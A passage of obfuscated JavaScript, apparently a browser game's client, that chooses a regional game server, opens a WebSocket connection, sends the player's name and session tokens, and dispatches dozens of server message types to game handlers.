					ᐃᐃΔ.ᐃΔⵠⲆᐃⵠⲆ = ᐃⲆᐃⵠ[ⵠΔᐃΔᐃ][ΔᐃⲆⵠⲆⵠΔ[31]]()
				}
				Timers.HealTimer = (new Date).getTime();
				Timers.GaugeTimer = (new Date).getTime();
				ᐃᐃΔ.Ⲇⵠⵠⵠᐃ.enabled = ᐃⲆᐃⵠ[6];
				ᐃᐃΔ.Ⲇⵠⵠⵠᐃ.ΔⲆΔⲆΔ = -1;
				ᐃᐃΔ.Ⲇⵠⵠⵠᐃ.label = null;
				ᐃᐃΔ.Ⲇⵠⵠⵠᐃ.now = -1;
				ΔΔᐃᐃ.set("starve_token_id", ᐃᐃΔ.ᐃΔⵠⲆᐃⵠⲆ);
				if (ᐃᐃΔ.reconnect.enabled) {
					ᐃᐃΔ.reconnect.rotate = Δⵠᐃ;
					ᐃᐃΔ.reconnect.enabled = ΔᐃⵠᐃⲆ
				} else {
					ⵠⲆᐃΔ.ⵠΔΔΔᐃ(ΔⵠⵠⲆ.ⲆΔΔᐃⵠ);
					if (ga) ga(ⵠ[499], ⵠ[37], ⵠ[383], ⵠ[500], "S" + ⵠⲆᐃΔ.ⲆⵠⲆᐃ + "A" + ⵠⲆᐃΔ.Δᐃᐃⵠᐃ)
				}
			};
			this.connect = function() {
				ᐃᐃᐃ.ⵠΔⵠⵠᐃᐃⲆ = ⵠⲆⲆ;
				ᐃᐃᐃ.ⲆᐃΔΔΔΔⵠ()
			};
			this.ⵠᐃᐃⲆΔⵠΔ = [];
			this.ⵠᐃⵠᐃᐃⵠⲆⵠΔ = function(ⲆᐃᐃⲆⲆΔⲆ) {
				const ᐃΔⵠⵠᐃ = ᐃᐃᐃ.ΔΔⲆΔⲆ.filter((Δⵠ => Δⵠ[ⵠ[454]] === ⲆᐃᐃⲆⲆΔⲆ));
				const regions = {};
				for (let ⵠᐃ = ⵠⲆⲆ; ⵠᐃ < ᐃΔⵠⵠᐃ.length; ⵠᐃ++) {
					const Ⲇᐃⵠᐃᐃ = ᐃΔⵠⵠᐃ[ⵠᐃ];
					const ΔΔⲆⵠⵠ = Ⲇᐃⵠᐃᐃ["r"];
					if (undefined === ΔΔⲆⵠⵠ) continue;
					if (regions[ΔΔⲆⵠⵠ] === ⲆΔᐃᐃᐃ) regions[ΔΔⲆⵠⵠ] = [];
					regions[ΔΔⲆⵠⵠ].push(Ⲇᐃⵠᐃᐃ)
				}

				function ⵠΔⲆⲆⲆΔⲆ(ΔΔⲆⵠⵠ) {
					ᐃᐃᐃ.ⵠᐃᐃⲆΔⵠΔ[ⲆᐃᐃⲆⲆΔⲆ] = ΔΔⲆⵠⵠ;
					const ᐃΔⵠⵠᐃ = regions[ΔΔⲆⵠⵠ];
					const Ⲇᐃⵠᐃᐃ = ᐃΔⵠⵠᐃ[Math.floor(Math.random() * ᐃΔⵠⵠᐃ.length)];
					ᐃᐃᐃ.ΔⵠΔᐃⲆᐃΔ({
						domain: ΔΔⲆⲆΔᐃΔ,
						is_tls: 1,
						id: Ⲇᐃⵠᐃᐃ[ⵠ[552]],
						p: Ⲇᐃⵠᐃᐃ["p"]
					})
				}
				if (ᐃᐃᐃ.ⵠᐃᐃⲆΔⵠΔ[ⲆᐃᐃⲆⲆΔⲆ] !== undefined) {
					ⵠΔⲆⲆⲆΔⲆ(ᐃᐃᐃ.ⵠᐃᐃⲆΔⵠΔ[ⲆᐃᐃⲆⲆΔⲆ]);
					return
				}
				let ᐃᐃⵠⵠⲆⲆⲆ = 1;

				function ⲆᐃΔⵠΔⵠΔ(ᐃΔⵠⵠᐃ) {
					const ᐃΔΔΔΔⲆᐃ = new ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[176]];
					const Ⲇᐃⵠᐃᐃ = ᐃΔⵠⵠᐃ[0];
					const ⲆΔΔⵠⵠⲆΔ = Ⲇᐃⵠᐃᐃ["p"];
					const ΔΔⲆⵠⵠ = Ⲇᐃⵠᐃᐃ["r"];
					const ⲆΔᐃⲆⵠΔᐃ = ⲆΔΔⵠⵠⲆΔ[Math.floor(Math.random() * ⲆΔΔⵠⵠⲆΔ.length)];
					ᐃΔΔΔΔⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[72]](ⵠ[526], "https://" + ⲆΔᐃⲆⵠΔᐃ + "." + ΔΔⲆⲆΔᐃΔ + "/", true);
					ᐃΔΔΔΔⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[199]] = function() {
						if (ᐃΔΔΔΔⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[41]] === 4) {
							if (ᐃᐃⵠⵠⲆⲆⲆ === 0) return;
							ᐃᐃⵠⵠⲆⲆⲆ = 0;
							ⵠΔⲆⲆⲆΔⲆ(ΔΔⲆⵠⵠ)
						}
					};
					ᐃΔΔΔΔⲆᐃ[ΔᐃⲆⵠⲆⵠΔ[129]]()
				}

				function ΔᐃΔⲆΔᐃⲆΔᐃ() {
					if (0 === ᐃᐃⵠⵠⲆⲆⲆ) return;
					ᐃᐃⵠⵠⲆⲆⲆ = ⵠⲆⲆ;
					const ΔⵠᐃⲆΔ = ᐃⲆᐃΔᐃⵠᐃ.Object.keys(regions);
					const ⵠⵠᐃᐃΔᐃⵠ = Math.floor(ΔⵠᐃⲆΔ.length * Math.random());
					const ᐃᐃⲆⲆΔ = ΔⵠᐃⲆΔ[ⵠⵠᐃᐃΔᐃⵠ];
					ⵠΔⲆⲆⲆΔⲆ(ᐃᐃⲆⲆΔ)
				}
				for (let ΔΔⲆⵠⵠ in regions) {
					const ᐃΔⵠⵠᐃ = regions[ΔΔⲆⵠⵠ];
					ⲆᐃΔⵠΔⵠΔ(ᐃΔⵠⵠᐃ)
				}
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[275]](ΔᐃΔⲆΔᐃⲆΔᐃ, 5e3)
			};
			this.ΔᐃΔΔⲆΔⵠⵠⵠ = function() {
				let ⲆᐃᐃⲆⲆΔⲆ = ΔᐃᐃΔ.ΔⲆᐃΔΔⲆⲆ[ᐃᐃᐃ.ⵠΔⵠⲆΔ];
				console.log(undefined, undefined, ⲆΔᐃᐃᐃ);
				let ᐃⵠⵠΔᐃⲆΔⵠⲆ = ᐃᐃᐃ.ⲆΔⵠⵠⵠΔᐃ[ᐃᐃᐃ.ⵠΔⵠⲆΔ];
				let Ⲇᐃᐃⵠᐃⵠᐃ = ᐃᐃᐃ.ΔΔⲆΔⲆ.find((Δⵠ => Δⵠ[ⵠ[454]] == ⲆᐃᐃⲆⲆΔⲆ && Δⵠ["idx"] == ᐃⵠⵠΔᐃⲆΔⵠⲆ));
				if (ⲆᐃΔⲆᐃ === Ⲇᐃᐃⵠᐃⵠᐃ) ᐃᐃᐃ.ⵠᐃⵠᐃᐃⵠⲆⵠΔ(ⲆᐃᐃⲆⲆΔⲆ);
				else ᐃᐃᐃ.ΔⵠΔᐃⲆᐃΔ({
					domain: ΔΔⲆⲆΔᐃΔ,
					is_tls: 1,
					id: Ⲇᐃᐃⵠᐃⵠᐃ[ⵠ[552]],
					p: Ⲇᐃᐃⵠᐃⵠᐃ["p"]
				})
			};
			this.ⲆᐃΔΔΔΔⵠ = function() {
				console.log(undefined);
				if (ΔⲆΔΔⲆⲆᐃ !== ⲆΔᐃᐃᐃ && undefined !== ⲆⵠⲆᐃⲆΔⵠ) {
					console.log(undefined, ⲆΔⵠⲆⲆ, ᐃⲆᐃⲆⲆ);
					ᐃᐃᐃ.ΔⵠΔᐃⲆᐃΔ({
						domain: ΔΔⲆⲆΔᐃΔ,
						is_tls: 1,
						id: ⲆⵠⲆᐃⲆΔⵠ + ΔⲆΔΔⲆⲆᐃ,
						p: ᐃᐃᐃ.ⵠⵠᐃΔᐃⲆᐃ[ⲆⵠⲆᐃⲆΔⵠ]
					});
					return
				}
				if (ΔΔⵠΔᐃ !== undefined) {
					ᐃᐃᐃ.ΔⵠΔᐃⲆᐃΔ({
						domain: ΔΔⵠΔᐃ["domain"],
						is_tls: ΔΔⵠΔᐃ["ssl"],
						id: ΔΔⵠΔᐃ[ⵠ[552]],
						p: [ΔΔⵠΔᐃ["p"]]
					});
					return
				}
				ᐃᐃᐃ.ΔᐃΔΔⲆΔⵠⵠⵠ()
			};
			this.ΔⵠΔᐃⲆᐃΔ = function(ⲆᐃᐃⲆᐃⵠⲆ) {
				let ⲆⵠⵠΔᐃᐃⵠ = ⲆᐃᐃⲆᐃⵠⲆ["domain"];
				let ⲆⵠⲆΔᐃᐃᐃⲆⵠ = ⲆᐃᐃⲆᐃⵠⲆ["is_tls"];
				let ΔΔᐃⵠΔᐃⵠⵠⲆ = ⲆᐃᐃⲆᐃⵠⲆ[ⵠ[552]];
				let ⲆΔΔⵠⵠⲆΔ = ⲆᐃᐃⲆᐃⵠⲆ["p"];
				let ⲆΔᐃⲆⵠΔᐃ = ⲆΔΔⵠⵠⲆΔ[Math.floor(Math.random() * ⲆΔΔⵠⵠⲆΔ.length)];
				let ΔⲆⵠΔΔᐃᐃⵠⵠ = ⲆⵠⲆΔᐃᐃᐃⲆⵠ ? "wss://" + ⲆΔᐃⲆⵠΔᐃ + "." + ⲆⵠⵠΔᐃᐃⵠ + "/" + ΔΔᐃⵠΔᐃⵠⵠⲆ + "?" + ᐃᐃΔ.ⲆΔⵠᐃᐃⵠⲆ : "ws://" + ⲆⵠⵠΔᐃᐃⵠ;
				console.log(undefined, undefined);
				ᐃᐃᐃ.ΔⲆⲆΔ = new ᐃⲆᐃΔᐃⵠᐃ.WebSocket(ΔⲆⵠΔΔᐃᐃⵠⵠ);
				ᐃᐃᐃ.ΔⲆⲆΔ["binaryType"] = "arraybuffer";
				ᐃᐃᐃ.ΔⲆⲆΔ.ΔⲆⲆᐃⲆ = ᐃᐃᐃ.ΔⲆⲆᐃⲆ;
				ᐃᐃᐃ.ΔⲆⲆΔ.onmessage = function(ΔΔΔⲆ) {
					if (ᐃᐃᐃ.ΔⲆⲆᐃⲆ != ᐃᐃᐃ.ΔⲆⲆᐃⲆ) return;
					if (typeof ΔΔΔⲆ.data == ⵠ[360]) {
						var ᐃⲆᐃⵠ = JSON.parse(ΔΔΔⲆ.data);
						switch (ᐃⲆᐃⵠ[ⵠⲆᐃⵠ]) {
							case ⲆΔⵠ:
								ᐃᐃᐃ.ⵠⵠⲆᐃᐃ(ᐃⲆᐃⵠ);
								break;
							case 1:
								ᐃᐃᐃ.ⲆⲆᐃⲆⵠⲆᐃ(ᐃⲆᐃⵠ[ᐃⲆᐃ]);
								break;
							case 2:
								ᐃᐃᐃ.ⲆⵠᐃᐃᐃⵠΔᐃᐃ(ᐃⲆᐃⵠ);
								break;
							case 3:
								ᐃᐃᐃ.ⲆⲆⵠⲆⲆᐃᐃΔᐃ(ᐃⲆᐃⵠ);
								break;
							case 4:
								ᐃᐃᐃ.message(ᐃⲆᐃⵠ[1]);
								break;
							case 5:
								ᐃᐃᐃ.ⵠⵠⵠᐃⵠⵠⵠ(ᐃⲆᐃⵠ);
								break;
							case ⵠΔᐃΔⲆ:
								ᐃᐃᐃ.ⵠΔᐃⲆᐃⲆᐃ(ᐃⲆᐃⵠ[1]);
								break
						}
					} else {
						var ⲆⲆⲆⵠ = ᐃΔⲆⲆΔⲆⲆΔΔ(ΔΔΔⲆ.data, ᐃᐃΔ.ⲆⲆⲆⵠΔᐃᐃ, ᐃᐃΔ.ᐃⵠᐃⵠⵠᐃⲆⲆᐃ);
						var ᐃᐃⵠⲆΔ = ⲆⲆⲆⵠ[ΔᐃⲆⵠⲆⵠΔ[73]];
						switch (ⲆⲆⲆⵠ[Ⲇᐃᐃᐃ]) {
							case 0:
								ᐃᐃᐃ.ΔⲆᐃ(ᐃᐃⵠⲆΔ, ⲆⲆⲆⵠ, ⲆⵠΔⵠΔ);
								break;
							case 1:
								ᐃᐃᐃ.ΔⲆᐃ(ᐃᐃⵠⲆΔ, ⲆⲆⲆⵠ, ΔᐃⲆⵠⵠ);
								break;
							case Ⲇᐃᐃⵠ:
								ᐃᐃᐃ.ΔΔᐃΔΔⵠⲆᐃⲆ();
								break;
							case ⵠⵠⵠᐃ:
								ᐃᐃᐃ.ᐃⵠⲆΔⲆΔⵠ(new Uint16Array(ᐃᐃⵠⲆΔ));
								break;
							case 4:
								ᐃᐃᐃ.ⲆᐃⲆⲆⲆⲆᐃⲆΔ();
								break;
							case 5:
								ᐃᐃᐃ.ⵠⵠΔⲆΔᐃΔⵠⲆ();
								break;
							case 6:
								ᐃᐃᐃ.ᐃⵠⵠᐃΔⲆᐃⲆⵠ();
								break;
							case 7:
								ᐃᐃᐃ.ⲆΔⲆᐃⵠⵠⲆΔⲆ(ᐃᐃⵠⲆΔ);
								break;
							case 8:
								ᐃᐃᐃ.ᐃᐃΔᐃⵠᐃⵠⲆⲆ(ⲆⲆⲆⵠ[1]);
								break;
							case 9:
								ᐃᐃᐃ.ⲆⵠⲆⵠⲆᐃⲆΔⲆ(ⲆⲆⲆⵠ[1]);
								break;
							case 10:
								ᐃᐃᐃ.ⵠⵠᐃⵠᐃⲆΔ();
								break;
							case 11:
								ᐃᐃᐃ.ΔⲆᐃⵠⵠⲆΔ(ⲆⲆⲆⵠ[1], ⲆⲆⲆⵠ[ⲆΔΔⵠ]);
								break;
							case ⵠⵠᐃΔⵠᐃᐃ:
								ᐃᐃᐃ.ⵠⵠⵠᐃΔ(ⲆⲆⲆⵠ[1]);
								break;
							case 13:
								ᐃᐃᐃ.ⲆΔᐃΔⲆⵠΔⲆᐃ(ⲆⲆⲆⵠ, ᐃᐃⵠⲆΔ);
								break;
							case ⵠⲆⲆⵠΔⵠⲆ:
								ᐃᐃᐃ.ⲆⵠⵠΔᐃⲆᐃⲆⵠ();
								break;
							case 15:
								ᐃᐃᐃ.ᐃⵠⵠᐃᐃΔΔⲆΔ(ⲆⲆⲆⵠ[ΔΔΔ]);
								break;
							case ⵠᐃᐃⵠΔⵠΔ:
								ᐃᐃᐃ.ⲆΔⲆⵠ(ⲆⲆⲆⵠ[ΔᐃⲆⵠ], ⲆⲆⲆⵠ[2], ⲆⲆⲆⵠ[3], ⲆⲆⲆⵠ[4], ⲆⲆⲆⵠ[ⵠᐃⲆΔ], ⲆⲆⲆⵠ[6], ⲆⲆⲆⵠ[7]);
								break;
							case 17:
								ᐃᐃᐃ.ΔΔⲆⲆΔΔⵠⲆᐃ(ᐃᐃⵠⲆΔ);
								break;
							case ᐃᐃΔᐃⲆⵠᐃ:
								ᐃᐃᐃ.ᐃΔΔⵠΔΔᐃΔⵠ();
								break;
							case 19:
								ᐃᐃᐃ.ⵠᐃⲆΔⲆ(ⲆⲆⲆⵠ[ⵠᐃⵠΔ]);
								break;
							case ⵠΔⵠⵠᐃ:
								ᐃᐃᐃ.ⲆΔᐃⵠⵠⵠΔᐃⵠ();
								break;
							case 21:
								ᐃᐃᐃ.ⲆⲆⵠΔᐃ(ᐃᐃⵠⲆΔ);
								break;
							case 22:
								ᐃᐃᐃ.ⲆⵠᐃⲆⲆΔΔⵠᐃ(ⲆⲆⲆⵠ[1]);
								break;
							case 23:
								ᐃᐃᐃ.ⵠⵠⲆⲆᐃᐃΔΔΔ(ᐃᐃⵠⲆΔ);
								break;
							case 24:
								ᐃᐃᐃ.ΔᐃᐃᐃⲆⵠⵠΔΔ(ⲆⲆⲆⵠ[1]);
								break;
							case 25:
								ᐃᐃᐃ.ⲆΔᐃΔⲆⲆΔᐃΔ(ⲆⲆⲆⵠ[ΔΔᐃⵠ], ᐃᐃⵠⲆΔ);
								break;
							case 26:
								ᐃᐃᐃ.ᐃⵠΔⲆⵠ(ⲆⲆⲆⵠ);
								break;
							case 27:
								ᐃᐃᐃ.ⵠⵠᐃⵠΔⵠᐃⲆⲆ();
								break;
							case 28:
								ᐃᐃᐃ.Ⲇⵠⵠⵠᐃ(ⲆⲆⲆⵠ[1]);
								break;
							case 29:
								ᐃᐃᐃ.ⵠᐃⵠΔᐃⲆⲆⵠΔ();
								break;
							case 30:
								ᐃᐃᐃ.ⵠᐃΔΔⵠⲆΔⲆᐃ();
								break;
							case 31:
								ᐃᐃᐃ.ΔΔⵠᐃᐃⲆⵠᐃⲆ(ⲆⲆⲆⵠ);
								break;
							case 32:
								ᐃᐃᐃ.ΔΔᐃΔΔⵠΔΔᐃ(ⲆⲆⲆⵠ[1]);
								break;
							case 33:
								ᐃᐃᐃ.ΔΔⵠᐃΔⲆⵠᐃᐃ(ⲆⲆⲆⵠ[ΔⵠΔⵠ]);
								break;
							case 34:
								ᐃᐃᐃ.ⵠΔⲆΔⲆⲆΔΔᐃ();
								break;
							case 35:
								ᐃᐃᐃ.ΔⲆⲆΔΔΔⵠΔⵠ(ⲆⲆⲆⵠ[ᐃⲆᐃ]);
								break;
							case 36:
								ᐃᐃᐃ.ᐃⵠΔᐃᐃΔⵠ(ⲆⲆⲆⵠ[1]);
								break;
							case 37:
								ᐃᐃᐃ.ⲆᐃᐃⵠⲆΔᐃⵠⵠ(ⲆⲆⲆⵠ[1], ⲆⲆⲆⵠ[2]);
								break;
							case 38:
								ᐃᐃᐃ.ⵠᐃΔᐃΔᐃΔⵠⲆ(ⲆⲆⲆⵠ[ⵠΔⵠΔ]);
								break;
							case 39:
								ᐃᐃᐃ.ᐃᐃᐃΔᐃⵠⲆⵠᐃ(ⲆⲆⲆⵠ[1]);
								break;
							case 40:
								ᐃᐃᐃ.ΔΔⲆⲆᐃⵠᐃⲆΔ();
								break;
							case 41:
								ᐃᐃᐃ.ᐃᐃᐃⲆⲆᐃⲆΔⵠ(ⲆⲆⲆⵠ);
								break;
							case 42:
								ᐃᐃᐃ.ᐃΔΔⵠⵠⵠᐃᐃⵠ(ⲆⲆⲆⵠ[ⵠΔⵠΔ]);
								break;
							case 43:
								ᐃᐃᐃ.ⲆΔᐃᐃΔⲆⲆⲆⲆ(ⲆⲆⲆⵠ[1]);
								break;
							case 44:
								ᐃᐃᐃ.claimed(ⲆⲆⲆⵠ[ΔⵠΔⵠ]);
								break;
							case 45:
								ᐃᐃᐃ.ᐃΔΔⲆᐃⵠᐃⵠⲆ(ⲆⲆⲆⵠ[1]);
								break;
							case 46:
								ᐃᐃᐃ.ⵠⵠΔᐃⲆᐃΔᐃⵠ(ⲆⲆⲆⵠ[ⵠᐃⵠΔ]);
								break;
							case 47:
								ᐃᐃᐃ.Ⲇⵠⵠⵠⵠ(ⲆⲆⲆⵠ[1]);
								break;
							case 48:
								ᐃᐃᐃ.ᐃᐃᐃᐃᐃⲆᐃⲆⲆ();
								break;
							case 50:
								ᐃᐃᐃ.ΔⲆᐃᐃⵠⲆΔⵠⲆ(ⲆⲆⲆⵠ[1], ⲆⲆⲆⵠ[Δᐃⵠⵠ], ⲆⲆⲆⵠ[Δⵠᐃⵠ]);
								break;
							case 51:
								ᐃᐃᐃ.ⵠΔⲆᐃⵠⵠᐃΔΔ();
								break;
							case 52:
								ᐃᐃᐃ.ⵠΔⵠᐃΔΔᐃⵠΔ(ⲆⲆⲆⵠ[1]);
								break;
							case 53:
								ᐃᐃᐃ.ⲆⵠᐃᐃΔⵠΔΔⵠ(ⲆⲆⲆⵠ[1]);
								break;
							case 54:
								ᐃᐃᐃ.ⲆᐃᐃⲆⵠⵠⵠᐃⲆ();
								break;
							case 55:
								ᐃᐃᐃ.ᐃⵠΔⲆᐃΔⲆⲆⵠ(ⲆⲆⲆⵠ[1]);
								break;
							case 56:
								ᐃᐃᐃ.ᐃⵠⲆΔⲆⲆⵠⲆⲆ(ⲆⲆⲆⵠ[1]);
								break;
							case 57:
								ᐃᐃᐃ.ᐃΔΔⵠᐃᐃⲆⲆΔ();
								break;
							case 58:
								ᐃᐃᐃ.ΔⵠⵠⲆΔΔⲆΔⵠ();
								break;
							case 59:
								ᐃᐃᐃ.ⲆⲆΔⲆᐃΔΔᐃⲆ();
								break;
							case 60:
								ᐃᐃᐃ.ΔΔᐃⲆΔⲆΔⵠᐃ();
								break;
							case 61:
								ᐃᐃΔ.ⲆΔΔ.ᐃᐃⵠᐃΔⲆⲆ = .2;
								ᐃᐃΔ.ⲆΔΔ.ΔⲆΔⲆΔ = 3;
								break;
							case 62:
								ᐃᐃᐃ.ᐃᐃᐃⵠᐃΔⵠⵠⵠ(new Uint16Array(ᐃᐃⵠⲆΔ));
								break;
							case 63:
								ᐃᐃᐃ.ΔᐃᐃⵠⵠⲆⵠᐃΔ();
								break;
							case 64:
								ᐃᐃᐃ.ΔΔᐃⲆⲆᐃᐃΔⲆ();
								break;
							case 65:
								ᐃᐃᐃ.ⲆᐃⲆΔⵠⲆᐃᐃΔ();
								break;
							case 66:
								ᐃᐃᐃ.ΔⲆⵠⲆᐃΔⵠΔⵠ();
								break;
							case 67:
								ᐃᐃᐃ.ΔᐃⵠⵠΔᐃΔⲆⵠ(ⲆⲆⲆⵠ[ⵠΔΔ]);
								break;
							case 68:
								ᐃᐃᐃ.ᐃΔΔΔᐃΔⲆⲆⵠ(ⲆⲆⲆⵠ[1]);
								break;
							case 69:
								ᐃᐃᐃ.Δⵠⵠⵠⵠᐃᐃ(ⲆⲆⲆⵠ[1]);
								break;
							case 70:
								ᐃᐃᐃ.ᐃΔⵠᐃᐃⲆⲆΔⲆ(ⲆⲆⲆⵠ[1]);
								break;
							case 71:
								ᐃᐃᐃ.ᐃΔⵠⲆᐃ(ⲆⲆⲆⵠ[ΔΔΔ]);
								break
						}
					}
				};
				ᐃᐃᐃ.ΔⲆⲆΔ.onerror = function() {
					if (ᐃᐃΔ.reconnect.enabled) ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[275]](ᐃᐃᐃ.timeout, 2500)
				};
				this.ΔⲆⲆΔ.onopen = function() {
					clearTimeout(ᐃᐃᐃ.ⵠⲆᐃᐃⵠ);
					ᐃᐃΔ.ⲆᐃⲆⲆⲆⵠⵠ = ᐃᐃΔ.ⲆᐃⲆⲆⲆⵠⵠ || ΔΔⲆᐃ.ⲆⲆᐃᐃⵠΔⲆ("token");
					ΔΔⲆᐃ.ΔⲆⵠΔⵠΔᐃ().then((ⲆⲆⵠⲆᐃᐃⵠΔⲆ => {
						ᐃᐃᐃ.ΔⲆⲆΔ[ᐃⵠΔΔ](ⲆⵠΔⲆᐃΔⵠ[ΔᐃΔᐃᐃΔⵠ].stringify([ⵠⲆᐃΔ.ⵠΔⵠⲆᐃ.input.value,4000,4000, ᐃⲆⵠᐃᐃ.ⵠΔⲆⲆΔⵠᐃ, ᐃᐃΔ.ᐃΔΔⲆⲆ, ᐃᐃΔ.ᐃΔⵠⲆᐃⵠⲆ, ᐃᐃΔ.reconnect.enabled ? ⵠⲆΔ : ΔᐃΔΔ, ⵠⲆᐃΔ.ⲆⵠⲆᐃ, ⵠⲆᐃΔ.Δᐃᐃⵠᐃ, ⵠⲆᐃΔ.ΔⵠΔᐃⲆ, ⵠⲆᐃΔ.ⵠⲆᐃⵠⵠ, ⵠⲆᐃΔ.ⲆᐃⲆⲆᐃ, ⵠⲆᐃΔ.ᐃⲆⵠΔⵠ, ΔⵠΔⲆᐃ === undefined ? Δᐃᐃⵠ : ΔⵠΔⲆᐃ, ⵠⵠΔΔⵠ === ᐃⲆᐃⲆⲆ ? ⲆΔⵠ : ⵠⵠΔΔⵠ.substring(ⵠⵠΔΔⵠ.length - 50), ⲆΔⵠⲆΔⲆⲆΔΔ, ᐃᐃΔ.ⲆᐃⲆⲆⲆⵠⵠ, ⲆⲆⵠⲆᐃᐃⵠΔⲆ, ᐃᐃΔ.ΔΔᐃⲆᐃⲆⲆ, ᐃᐃΔ.ⲆΔᐃΔⵠΔⲆ]));
						ᐃᐃΔ.ⲆᐃⲆⲆⲆⵠⵠ = ⲆΔⵠⲆⵠ;
						ᐃᐃΔ.ΔΔᐃⲆᐃⲆⲆ = ΔΔⵠᐃΔ;
						ᐃᐃΔ.ⲆΔᐃΔⵠΔⲆ = undefined;
						ᐃᐃΔ.ⲆΔⵠᐃᐃⵠⲆ = undefined;
						ᐃᐃᐃ.ⵠⲆᐃᐃⵠ = setTimeout(ᐃᐃᐃ.timeout, ᐃⲆⵠᐃᐃ.ΔⵠΔΔⵠΔⲆⲆⵠ)
					}))
				}
			}
		}

		function ⲆᐃⵠⲆΔⲆΔ(ⲆⲆⵠⲆⲆⵠⵠ, ⵠΔΔΔᐃⵠᐃ, ΔΔⲆⲆΔΔΔ, ᐃⵠᐃⵠΔΔⵠ, ⲆᐃΔᐃⲆ, ᐃΔΔⲆΔⵠᐃ) {
			ⲆΔΔⲆᐃΔⲆ(ⲆᐃΔⵠⲆ, ⲆⲆⵠⲆⲆⵠⵠ, ⵠΔΔΔᐃⵠᐃ, ΔΔⲆⲆΔΔΔ, ᐃⵠᐃⵠΔΔⵠ, ⲆᐃΔᐃⲆ, ᐃΔΔⲆΔⵠᐃ);
			const ᐃⲆⲆⵠⲆᐃᐃΔΔ = ΔΔᐃⵠΔᐃⲆ(ΔᐃΔᐃ[0], ΔᐃΔᐃ[1], ΔᐃΔᐃ[ᐃⲆΔⲆ], ΔᐃΔᐃ[ᐃᐃⲆΔⵠ], ΔᐃΔᐃ[ⵠΔᐃΔ], ΔᐃΔᐃ[ⵠⵠΔⵠ]);
			const ⲆⵠⵠⵠⵠᐃⵠᐃⲆ = ⵠⲆᐃⲆⲆⵠΔ(ΔᐃΔᐃ[0], ΔᐃΔᐃ[ΔᐃᐃⲆ], ΔᐃΔᐃ[2], ΔᐃΔᐃ[3], ΔᐃΔᐃ[Ⲇᐃⵠᐃ]);
			const ᐃΔⲆΔⲆᐃⵠᐃΔ = ᐃⲆⲆⵠⲆᐃᐃΔΔ ^ 62660;
			return ᐃΔⲆΔⲆᐃⵠᐃΔ
		}

		function ᐃᐃΔⵠⵠⵠᐃ(ᐃⵠΔⲆⲆ, ΔⵠⵠΔⵠ, ⲆⵠⲆⲆⲆΔⲆ, ᐃᐃᐃΔⵠⵠΔ, ΔⲆᐃⲆᐃᐃⲆ, ⵠᐃⵠᐃΔᐃⵠⵠⵠ) {
			const ⲆᐃⲆΔⵠⵠⲆ = (24 << (ᐃⵠΔⲆⲆ >> ᐃⵠⵠⵠⲆ & 255)) + (0 << (ᐃⵠΔⲆⲆ >> 24 & ΔΔᐃΔⲆ)) + (8 << (ᐃⵠΔⲆⲆ >> 16 & ⵠᐃⲆᐃᐃⵠᐃ)) + (16 << (ᐃⵠΔⲆⲆ >> 0 & 255));
			const ᐃⲆΔⲆⲆⵠⵠ = (16 << (ΔⵠⵠΔⵠ >> 8 & 255)) + (24 << (ΔⵠⵠΔⵠ >> 24 & 255)) + (0 << (ΔⵠⵠΔⵠ >> 16 & 255)) + (8 << (ΔⵠⵠΔⵠ >> 0 & 255));
			const ⲆᐃⵠⵠⲆⵠΔ = ~(45171 & ⲆⵠⲆⲆⲆΔⲆ) & (ⲆⵠⲆⲆⲆΔⲆ | 45171);
			const ᐃⵠΔΔΔᐃⵠ = (2147483629 * (ᐃᐃᐃΔⵠⵠΔ + 17518) + 2147483587) % 2147483647;
			const ⲆᐃⲆⲆⲆᐃⲆᐃⵠ = ~(15877 & ΔⲆᐃⲆᐃᐃⲆ) & (15877 | ΔⲆᐃⲆᐃᐃⲆ);
			const ⵠⵠⵠⵠΔⲆⵠΔⵠ = (1664525 * (ⵠᐃⵠᐃΔᐃⵠⵠⵠ + 13592) + 1013904223) % 4294967296;
			const ΔⵠⲆᐃΔᐃⲆᐃⵠ = ⲆᐃΔᐃΔⵠᐃ(ⲆᐃⲆΔⵠⵠⲆ, ᐃⲆΔⲆⲆⵠⵠ, ⲆᐃⵠⵠⲆⵠΔ, ᐃⵠΔΔΔᐃⵠ, ⲆᐃⲆⲆⲆᐃⲆᐃⵠ, ⵠⵠⵠⵠΔⲆⵠΔⵠ);
			const ⲆⲆΔᐃⲆⵠᐃᐃⵠ = ᐃΔᐃⵠⲆⵠᐃ(ⲆᐃⲆΔⵠⵠⲆ, ᐃⲆΔⲆⲆⵠⵠ, ⲆᐃⵠⵠⲆⵠΔ, ᐃⵠΔΔΔᐃⵠ);
			const ⵠⵠᐃΔⵠᐃⵠΔⵠ = (((ΔⵠⲆᐃΔᐃⲆᐃⵠ ^ ⲆⲆΔᐃⲆⵠᐃᐃⵠ) + 64538) * 2147483629 + 2147483587) % 2147483647;
			return ⵠⵠᐃΔⵠᐃⵠΔⵠ
		}

		function ᐃⵠΔᐃᐃⵠⲆ(ΔΔᐃⵠΔⲆⲆ, ⵠΔΔⲆᐃᐃΔ) {
			ᐃΔΔⲆⵠΔⲆ(ⲆᐃΔⵠⲆ, ΔΔᐃⵠΔⲆⲆ, ⵠΔΔⲆᐃᐃΔ);
			const ⵠⵠΔΔⲆΔⵠ = ΔΔⲆⵠᐃⲆΔ(ΔᐃΔᐃ[0], ΔᐃΔᐃ[1]);
			const ⲆᐃⵠⵠΔΔⵠ = ⲆᐃᐃⲆΔᐃⲆ(ΔᐃΔᐃ[ΔΔⵠⵠ], ΔᐃΔᐃ[1], ΔᐃΔᐃ[0], ΔᐃΔᐃ[1], ΔᐃΔᐃ[0], ΔᐃΔᐃ[ᐃⲆᐃ]);
